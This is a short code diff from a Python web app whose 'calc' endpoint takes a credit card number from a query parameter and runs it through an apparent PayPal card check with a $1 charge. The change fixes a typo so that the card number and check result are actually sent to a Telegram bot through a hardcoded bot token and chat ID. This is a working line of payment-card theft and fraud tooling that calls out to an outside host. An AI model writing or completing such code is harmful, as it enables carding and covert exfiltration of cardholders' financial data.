@@ -412,7 +412,7 @@ def calc():
     try:
         a = request.args.get("cc")
         result=paypal(a)
-        request.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={a}|{result}')
+        requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={a}|{result}')
         return jsonify({
            'card': a,
            'amount': '1$',
